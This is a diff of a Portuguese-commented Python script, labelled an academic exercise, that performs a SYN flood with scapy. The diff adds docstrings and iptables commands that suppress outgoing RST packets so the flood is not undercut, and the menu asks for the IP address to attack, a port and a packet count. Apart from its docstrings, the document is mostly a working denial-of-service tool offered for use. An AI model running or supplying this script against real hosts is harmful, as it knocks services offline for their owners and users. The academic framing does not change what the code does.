@@ -1,3 +1,14 @@
+"""
+Exercício - Elaborar um SYN flood
+
+Este módulo inclui funções para:
+- Validação de endereços IPv4;
+- Verificação básica de conectividade a um host;
+- Interação com o utilizador através de menu em consola;
+- Execução de envio de tráfego TCP para fins académicos.
+
+"""
+
 import socket
 import random
 import os
@@ -6,6 +17,12 @@ import errno
 from scapy.all import *
 
 def ip_valido(ip):
+    """
+    Verifica se uma string corresponde a um endereço IPv4 válido.
+
+    :param ip: Endereço IPv4 em formato string
+    :return: True se for válido, False caso contrário
+    """
     octetos = ip.split(".")
 
     if len(octetos) != 4:
@@ -26,6 +43,14 @@ def ip_valido(ip):
     return True
 
 def ip_responde(ip):
+    """
+    Testa se um IP aparenta responder a uma tentativa de ligação TCP.
+
+    Considera o host ativo se existir resposta ou recusa explícita.
+
+    :param ip: Endereço IPv4
+    :return: True se o host aparentar responder, False caso contrário
+    """
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     sock.settimeout(1)
     try:
@@ -41,7 +66,17 @@ def ip_responde(ip):
     return False
 
 def syn_flood(ip, porta, total_pacotes):
+    """
+    Função principal do exercício responsável pelo envio de tráfego de rede.
 
+    Esta função foi mantida conforme o código original, sendo utilizada
+    exclusivamente em contexto académico e em ambientes controlados.
+
+    :param ip: Endereço IPv4 de destino
+    :param porta: Porta TCP de destino
+    :param total_pacotes: Número de pacotes a enviar
+    :return: None
+    """
     conf.verb = 0
     delay = 0.01
     pacotes_enviados = 0
@@ -76,6 +111,14 @@ def syn_flood(ip, porta, total_pacotes):
             time.sleep(delay)
         
 def menu():
+    """
+    Solicita ao utilizador os parâmetros necessários:
+    - IP válido
+    - Porta TCP válida
+    - Número de pacotes a enviar
+
+    :return: Tuplo (ip, porta, pacotes)
+    """
     while True:
         ip = input("Introduza o IP que pretende atacar: ").strip()
         if ip_valido(ip):
@@ -105,14 +148,24 @@ def menu():
     return ip, porta, pacotes
 
 def main():
+    """
+    Função principal do programa.
+
+    - Configura regras temporárias do sistema
+    - Mostra interface no terminal
+    - Recolhe parâmetros do utilizador
+    - Executa a funcionalidade principal
+    """
+    os.system('sudo iptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP')
     os.system('clear')
     os.system('figlet Syn Flood')
-
     print("\nO script pede o IP da máquina alvo do Syn Flood, a porta alvo e o número de pacotes a enviar.\n")
 
     ip, port, counter = menu()
     syn_flood(ip, port, counter)
 
+    os.system('sudo iptables -D OUTPUT -p tcp --tcp-flags RST RST -j DROP')
+    
 
 if __name__ == "__main__":
     main()
